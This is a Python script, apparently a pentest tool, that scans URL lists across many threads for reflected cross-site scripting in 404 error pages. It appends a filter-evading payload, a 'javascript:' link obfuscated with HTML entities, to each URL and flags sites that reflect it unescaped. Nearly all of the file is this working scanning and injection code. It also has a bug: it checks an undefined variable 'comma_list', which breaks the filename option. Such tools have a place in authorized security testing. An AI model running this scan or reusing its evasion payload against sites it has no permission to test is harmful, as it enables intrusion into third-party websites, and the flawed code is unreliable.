#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from lxml import html
from urllib.parse import urljoin
from threading import Thread

import click
import multiprocessing
import re
import requests
from requests.exceptions import RequestException
import sys
import queue

__author__ = '0ren'


class CommaList(click.ParamType):

    name = 'comma_list'

    def convert(self, value, param, ctx):
        return re.sub(r'\s+', '', value).strip().split(',')


class XSS404Fuzzer(Thread):

    PAYLOAD = '<A/iD=XsS hREf=javascript&colon;(alert)&lpar;1&rpar; id=XsS>nudes</A>'
    USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'

    def __init__(self, request_queue, timeout, verbose):
        super(XSS404Fuzzer, self).__init__()
        self.timeout = timeout
        self.verbose = verbose
        self.request_queue = request_queue

    def _handle_request(self, url):
        try:
            response = requests.get(
                urljoin(
                    url,
                    self.PAYLOAD),
                timeout=self.timeout,
                headers={
                    'user-agent': self.USER_AGENT})
            if response.status_code != requests.status_codes.codes.not_found:
                if self.verbose:
                    click.echo(
                        '{} responded with {}. Try manual testing ...'.format(
                            url, response.status_code))
                    return False
            return response
        except RequestException as error:
            click.echo(str(error), file=sys.stderr)
            return False

    @staticmethod
    def _found_xss(response):
        tree = html.fromstring(response.content)
        elem = tree.xpath('//a[@id="XsS" and text()="nudes"]')
        return True if elem else False

    def run(self):
        while True:
            url = self.request_queue.get()
            response = self._handle_request(url)
            if isinstance(response, requests.Response):
                if self._found_xss(response):
                    click.echo('{} appears to be vulnerabe to XSS'.format(url))
            self.request_queue.task_done()


@click.command(context_settings=dict(help_option_names=['-h', '--help']))
@click.option('-v', '--verbose', is_flag=True,
              help='Enable verbose mode.', default=False)
@click.option('-f', '--filename', type=click.Path(exists=True),
              help='Explicit file path containing url(s).')
@click.option('-l', '--list-items', type=CommaList(),
              help='Comma separated list containing url(s).')
@click.option('-w', '--workers', type=int, default=multiprocessing.cpu_count(),
              help='Number of worker threads.')
@click.option('-t', '--timeout', type=int, default=30,
              help='Maximum request timeout.')
def scan(verbose, filename, list_items, workers, timeout):
    """Identify websites vulnerable to XSS via 404 error responses."""
    if len(sys.argv[1:]) == 0:
        raise click.UsageError(
            'empty args. Try \'{} --help\' for more info'.format(sys.argv[0]))
    if filename and comma_list:
        raise click.BadOptionUsage(
            'multiple input flags are NOT allowed.')
    url_queue = queue.Queue()
    fuzz_pool = [XSS404Fuzzer(url_queue, timeout, verbose)
                 for _ in range(workers)]
    for worker in fuzz_pool:
        worker.setDaemon(True)
        worker.start()
    if filename:
        with open(filename, 'r') as f:
            for line in f:
                url = line.strip()
                if url:
                    url_queue.put(url)
            url_queue.join()
        return
    for item in list_items:
        url = item
        if url:
            url_queue.put(url)
    url_queue.join()


if __name__ == '__main__':
    scan()
